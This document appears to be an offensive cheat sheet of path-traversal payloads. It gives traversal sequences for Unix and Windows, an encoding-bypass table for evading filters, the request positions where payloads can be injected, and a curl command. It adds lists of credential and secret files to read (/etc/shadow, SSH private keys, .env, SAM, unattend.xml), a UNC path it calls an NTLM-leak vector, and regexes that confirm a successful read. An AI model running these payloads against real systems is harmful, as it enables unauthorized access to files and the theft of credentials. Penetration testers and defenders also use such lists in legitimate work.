# Traversal Payload Catalog

## Base sequences and depth

Depth is unknown; ladder it 1–10 (deeper rarely helps since extra `../` at
root is a no-op on Unix — so start deep: `../../../../../../../../etc/passwd`
collapses to `/etc/passwd` regardless of actual depth, UNLESS the app
validates depth or prepends a path that must stay valid).

```
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../../../../../../../etc/passwd      # go deep by default
/etc/passwd                                   # absolute — try first, it's free
```

Windows (both separators; drive-absolute too):

```
..\..\..\..\windows\win.ini
../../../../windows/win.ini                   # forward slashes work on Windows APIs
C:\windows\win.ini
C:/windows/win.ini
\\198.51.100.9\share\x                        # UNC — also an NTLM-leak vector
```

## Encoding bypass matrix

| Filter behavior | Bypass |
|---|---|
| blocks literal `../` | `%2e%2e%2f`, `%2e%2e/`, `..%2f`, `..%5c`, `..\` |
| decodes then validates once | double-encode: `%252e%252e%252f`, `%252e%252e%255c` |
| validates then decodes (or IIS/Java canonicalization gaps) | overlong UTF-8 `..%c0%af`, `..%c1%9c`; fullwidth `..%ef%bc%8f` |
| strips `../` non-recursively | `....//` → strip yields `../`; also `....\/`, `..././`, `...\.\` |
| strips `../` recursively but not `..\` | backslashes: `..\..\..\etc\passwd` |
| requires an allowed prefix | `allowed_dir/../../../etc/passwd` |
| requires an allowed suffix/extension | null byte `%00` (PHP<5.3.4), `%00.jpg`; path truncation (very long `./././...` suffix, legacy); `php://filter` resource ignores appended ext in some sinks |
| blocks `/etc/passwd` string | `/etc/passwd%00`, `/etc//passwd`, `/etc/./passwd`, `/etc/ignored/../passwd`, case tricks on Windows |
| nginx/proxy normalization | `..%2f` after an aliased location: `/static../etc/passwd` (nginx alias misconfig `location /static { alias /app/static/; }` → `/static../` escapes) |

Combinable: encodings × separators × depth. ffuf a cross-product list when
manual picks fail (DotDotPwn `-m stdout` generates exactly this).

## Marker positions

The vulnerable spot isn't always the whole value:

```
?file=TRAVERSAL
?file=TRAVERSALetc/passwd
?file=en_TRAVERSAL              # lang=en_../../..
?file=template.php&dir=TRAVERSAL
POST body fields, JSON {"path": "TRAVERSAL"}
Cookie: theme=TRAVERSAL
X-Original-URL / X-Rewrite-URL headers
URL path itself: GET /download/..%2f..%2f..%2fetc%2fpasswd
```

For the URL-path variant, send with curl `--path-as-is` (otherwise curl
normalizes the dots away):

```
curl --path-as-is "http://192.0.2.10/files/../../../etc/passwd"
```

## Read targets — Unix

```
/etc/passwd                      # confirm: root:x:0:0:
/etc/shadow                      # only if running as root
/etc/hosts  /etc/hostname  /etc/issue  /etc/os-release
/etc/nginx/nginx.conf  /etc/nginx/sites-enabled/default
/etc/apache2/apache2.conf  /etc/apache2/sites-enabled/000-default.conf
/etc/httpd/conf/httpd.conf
/etc/mysql/my.cnf  /etc/php/*/apache2/php.ini
/proc/self/environ              # env vars incl. secrets; also an LFI exec vector
/proc/self/cmdline              # how the app was started -> paths
/proc/self/maps                 # loaded libs (for binary exploitation pivots)
/proc/self/cwd/index.php        # app source relative to CWD -- great unknown-path trick
/proc/self/fd/0..30             # open files incl. logs
/root/.ssh/id_rsa  /home/<user>/.ssh/id_rsa  ~/.bash_history
/var/log/apache2/access.log  /var/log/nginx/access.log  /var/log/auth.log
/var/lib/php/sessions/sess_<PHPSESSID>
```

App configs (adjust root from error messages / cmdline):

```
/var/www/html/config.php  /var/www/html/wp-config.php
/var/www/html/.env  /app/.env  /var/www/app/config/database.php
.../application.yml  .../settings.py  .../web.config
```

## Read targets — Windows

```
C:\Windows\win.ini               # confirm: [fonts] or [extensions]
C:\Windows\System32\drivers\etc\hosts
C:\Windows\system.ini
C:\inetpub\wwwroot\web.config
C:\Windows\Panther\unattend.xml  C:\Windows\Panther\Unattended.xml   # install creds
C:\Windows\System32\config\SAM  (locked while running; try \RegBack\)
C:\inetpub\logs\LogFiles\W3SVC1\u_ex<yymmdd>.log
C:\xampp\apache\logs\access.log  C:\xampp\php\php.ini
C:\Users\<user>\.ssh\id_rsa
```

## Success-detection patterns

| Target | Match |
|---|---|
| /etc/passwd | `root:.*:0:0:` |
| win.ini | `[fonts]`, `; for 16-bit app support` |
| /proc/self/environ | `PATH=`, NUL-separated pairs |
| php://filter b64 | response is pure base64; decode and look for `<?php` |
| .env | `APP_KEY=`, `DB_PASSWORD=` |
| web.config | `<configuration>` |

Also watch *negative* signals: identical-length responses for every payload
= WAF/static error page; per-payload different 500s = you're reaching the
filesystem layer, keep encoding.
